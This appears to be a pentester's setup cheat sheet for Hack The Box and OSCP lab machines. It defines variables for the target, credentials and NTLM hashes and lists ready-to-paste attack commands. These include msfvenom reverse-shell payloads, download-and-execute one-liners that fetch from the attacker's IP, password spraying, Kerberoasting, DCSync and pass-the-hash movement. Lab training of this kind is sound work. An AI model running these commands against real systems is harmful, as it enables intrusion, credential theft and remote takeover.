# Pre-Engagement Kali Setup

Paste-and-fill workflow for every box, lab, or engagement. Set the variables once at the top, then copy commands from anywhere in the vault without editing IPs or credentials.

---

## 1. Master Paste Block

Copy the whole thing, fill in the quoted values, then run it. The directory and `/etc/hosts` lines run automatically.

```bash
# ============================================================
# FILL IN THESE VALUES
# ============================================================
export BoxIP="10.10.11.x"
export BoxName="machinename"          # HTB machine name / lab hostname
export Domain="DOMAIN.LOCAL"          # leave blank ("") if not an AD box
export DCip="10.10.11.x"             # leave blank ("") if not an AD box
export Username="username"            # update as you find creds
export Password="password"            # update as you find creds
export Username2=""                   # second cred set (fill as found)
export Password2=""                   #
export Username3=""                   # third cred set (fill as found)
export Password3=""                   #
export Hash=""                        # NTLM hash — update when you have one (PtH)
export Port="4444"                    # default listener port — change if needed
export Port2="4445"                   # second listener (handler while first is busy)
export WebPort="80"                   # target web service port — change to 443/8080 as needed
export URL=""                         # full target URL — e.g. http://$BoxIP or http://$BoxName/login
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"

# ============================================================
# AUTO-DETECT YOUR ATTACK IP
# ============================================================
export LocalIP=$(ip a show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
# If not on a VPN (tun0 absent), falls back silently — override manually:
# export LocalIP="192.168.45.x"

# ============================================================
# WORKSPACE (runs automatically)
# ============================================================
mkdir -p ~/boxes/$BoxName/{nmap,loot,exploits,www,screenshots}
cd ~/boxes/$BoxName

# Add to /etc/hosts (skips if BoxName is blank)
[[ -n "$BoxName" && -n "$BoxIP" ]] && \
  echo "$BoxIP  $BoxName  ${BoxName}.${Domain}" | sudo tee -a /etc/hosts

# Confirmation
echo ""
echo "  Box:    $BoxName  ($BoxIP)"
echo "  Domain: $Domain  (DC: $DCip)"
echo "  Creds:  $Username / $Password  (hash: ${Hash:-none})"
echo "  Creds2: ${Username2:-—} / ${Password2:-—}"
echo "  Creds3: ${Username3:-—} / ${Password3:-—}"
echo "  URL:    ${URL:-not set}  (web port: $WebPort)"
echo "  You:    $LocalIP  (ports: $Port / $Port2)"
echo "  Words:  $Wordlist"
echo "  Dir:    $(pwd)"
echo ""
```

> 📸 Screenshot: terminal after pasting the block showing the confirmation summary

---

## 2. Updating Credentials Mid-Box

When you crack a password, find new creds, or dump a hash, just re-export the variable in the same terminal. All subsequent commands pick it up immediately.

```bash
# You just cracked a password
export Password="Welcome1"
export Username="sgage"

# You found a second set of creds mid-box
export Username2="sqlsvc"
export Password2="DB_passw0rd"

# You have three accounts going (e.g. user, service, admin)
export Username3="Administrator"
export Password3="Sup3rS3cur3!"

# You're working a web app and want the base URL locked in
export URL="http://10.10.11.48/login.php"
export WebPort="8080"

# You switched to a bigger wordlist for a deeper dir brute
export Wordlist="/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt"

# You dumped a hash
export Hash="aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b"
# For PtH tools, most want just the NT half (after the colon):
export NThash="64f12cddaa88057e06a81b54e73b949b"

# You escalated to DA
export Username="Administrator"
export Password="Sup3rS3cur3!"
```

Keep the terminal window open throughout the box. Everything stays set for the session.

---

## 3. Commands Using the Variables

Copy any of these straight into the terminal. No editing required once the variables are set.

### Recon

```bash
# Quick nmap (top 1000 ports, service + script)
sudo nmap -sC -sV -oA nmap/$BoxName $BoxIP

# Full port scan (all 65535 ports, then targeted follow-up)
sudo nmap -p- --min-rate 10000 -oA nmap/${BoxName}_allports $BoxIP

# UDP top 100
sudo nmap -sU --top-ports 100 -oA nmap/${BoxName}_udp $BoxIP

# Web content discovery
gobuster dir -u http://$BoxIP \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -o loot/gobuster.txt

# Subdomain / vhost discovery
gobuster vhost -u http://$BoxName \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain -o loot/vhosts.txt
```

### Credential Testing

```bash
# SMB — check creds, look for Pwn3d!
crackmapexec smb $BoxIP -u $Username -p $Password
crackmapexec smb $BoxIP -u $Username -H $NThash

# WinRM
crackmapexec winrm $BoxIP -u $Username -p $Password

# SSH
ssh $Username@$BoxIP

# FTP
ftp $BoxIP   # then: user > $Username > $Password
```

### Shells

```bash
# Listener (rlwrap gives arrow-key history on the shell you catch)
rlwrap nc -lvnp $Port

# msfvenom Linux reverse shell ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LocalIP LPORT=$Port -f elf -o www/shell.elf

# msfvenom Windows reverse shell EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LocalIP LPORT=$Port -f exe -o www/shell.exe

# msfvenom Windows staged (Meterpreter)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=$Port -f exe -o www/meter.exe

# Serve payloads
python3 -m http.server 80 -d www/
# Download on target: curl http://$LocalIP/shell.elf -o /tmp/shell.elf
```

### Active Directory

```bash
# Kerberos username enum (no lockout risk)
kerbrute userenum -d $Domain --dc $DCip /opt/jsmith.txt

# Password spray (1 attempt per account)
kerbrute passwordspray -d $Domain --dc $DCip users.txt $Password

# Kerberoasting (from Linux)
GetUserSPNs.py -request -dc-ip $DCip $Domain/$Username:$Password

# AS-REP roasting (no creds needed if target accounts have pre-auth off)
impacket-GetNPUsers -request -dc-ip $DCip -outputfile loot/asrep.hash $Domain/$Username:$Password

# bloodhound-python remote collection
bloodhound-python -d $Domain -u $Username -p $Password -ns $DCip -c all
zip -r loot/bh_$(date +%s).zip *.json && mv *.json loot/

# DCSync (needs DS-Replication rights)
impacket-secretsdump -dc-ip $DCip -just-dc-user krbtgt $Domain/$Username:$Password@$DCip

# PtH lateral movement
impacket-psexec $Domain/$Username@$BoxIP -hashes :$NThash
impacket-wmiexec $Domain/$Username@$BoxIP -hashes :$NThash
```

### Remote Access

```bash
# WinRM / evil-winrm
evil-winrm -i $BoxIP -u $Username -p $Password
evil-winrm -i $BoxIP -u $Username -H $NThash

# RDP (password)
xfreerdp /v:$BoxIP /u:$Username /p:$Password /dynamic-resolution +clipboard

# RDP (hash — needs DisableRestrictedAdmin=0 on target)
xfreerdp /v:$BoxIP /u:$Username /pth:$NThash /dynamic-resolution +clipboard

# impacket suite
impacket-psexec $Domain/$Username:$Password@$BoxIP
impacket-smbexec $Domain/$Username:$Password@$BoxIP
impacket-wmiexec $Domain/$Username:$Password@$BoxIP
```

### File Transfer (serving to target)

```bash
# HTTP server on port 80 (serving www/ directory)
python3 -m http.server 80 -d www/

# Download one-liner to paste on target (Linux)
echo "curl http://$LocalIP/shell.elf -o /tmp/s && chmod +x /tmp/s && /tmp/s"

# Download one-liner to paste on target (Windows PowerShell)
echo "iwr http://$LocalIP/shell.exe -OutFile C:\\Windows\\Temp\\s.exe; C:\\Windows\\Temp\\s.exe"
```

---

## 4. Directory Structure

After the paste block runs you'll have:

```
~/boxes/MachineName/
├── nmap/           ← all nmap output files (-oA goes here)
├── loot/           ← hashes, creds, flags, BloodHound ZIPs
├── exploits/       ← PoC scripts, modified exploits
├── www/            ← payloads served via python3 -m http.server
└── screenshots/    ← proof screenshots for the report
```

---

## 5. Variable Quick-Reference

| Variable | What it holds | Example |
|---|---|---|
| `$BoxIP` | Target machine IP | `10.10.11.48` |
| `$BoxName` | Machine hostname | `administrator` |
| `$Domain` | AD domain FQDN | `INLANEFREIGHT.LOCAL` |
| `$DCip` | Domain Controller IP | `10.10.11.5` |
| `$Username` | Primary working credential | `forend` |
| `$Password` | Primary working password | `Klmcargo2` |
| `$Username2` | Second cred set (fill as found) | `sqlsvc` |
| `$Password2` | Second password | `DB_passw0rd` |
| `$Username3` | Third cred set (fill as found) | `Administrator` |
| `$Password3` | Third password | `Sup3rS3cur3!` |
| `$Hash` | Full NTLM hash (LM:NT) | `aad3b...:64f12c...` |
| `$NThash` | NT half only (for most tools) | `64f12cddaa88057e...` |
| `$LocalIP` | Your attack machine IP (tun0) | `10.10.14.15` |
| `$Port` | Primary listener port | `4444` |
| `$Port2` | Second listener port | `4445` |
| `$WebPort` | Target web service port | `80` / `443` / `8080` |
| `$URL` | Full target URL | `http://10.10.11.48/login` |
| `$Wordlist` | Current wordlist path | `/usr/share/seclists/...` |

> 🔍 Worth remembering generally: most Impacket tools want the full `LM:NT` format for `-hashes`, but crackmapexec, evil-winrm, and xfreerdp want just the NT hash. Keep both exported so you don't have to manually split mid-engagement. The LM half is almost always `aad3b435b51404eeaad3b435b51404ee` (empty LM) so `$Hash` is really `:$NThash` in practice.

---

## 6. Bash Variable Syntax — Gotchas

Bare `$Variable` works in most contexts. Use `${Variable}` when the variable name runs directly into other text:

```bash
# Fine — space or punctuation after the variable
ssh $Username@$BoxIP
echo "Host: $BoxIP"

# Needs braces — text immediately follows the variable name
echo "${BoxName}admin"         # → machinameadmin (NOT $BoxNameadmin)
echo "nmap/${BoxName}_all"     # → nmap/machinename_all ✓

# Also use braces for default-value substitution
echo "${Hash:-none set}"       # prints "none set" if Hash is empty
```

---

## 7. /etc/hosts Hygiene

The paste block appends to `/etc/hosts` every time you run it. To avoid duplicate entries building up across boxes:

```bash
# Check current entries for this box
grep "$BoxName\|$BoxIP" /etc/hosts

# Clean up old entries at end of session (or before next box)
sudo sed -i "/$BoxIP/d" /etc/hosts
```

> 🔧 Technique: when reusing a Kali VM across multiple HTB boxes, stale `/etc/hosts` entries from earlier boxes can cause silent failures (vhost mismatches, unexpected 200s from old IPs). Run the `sed -i` cleanup before every new box.

---

## 8. OSCP Lab vs HTB Differences

| | HTB | OSCP Lab / PG |
|---|---|---|
| Your IP | tun0 (HTB VPN) | tun0 (lab VPN) or eth0 |
| Target IP | from HTB machine page | from dashboard / module |
| Domain | stated in box description | sometimes, check nmap |
| Proof location | `user.txt` / `root.txt` in home/Desktop | `local.txt` / `proof.txt` |
| `/etc/hosts` needed? | usually yes for web boxes | sometimes |

For OSCP proof screenshots, the required output is: `whoami` + `hostname` + `ip addr` + `type proof.txt` (or `cat /root/proof.txt`), all in one screenshot.

---

#### Tags: #PreEngagement #Setup #Variables #KaliSetup #Methodology #BoxSetup #Workflow
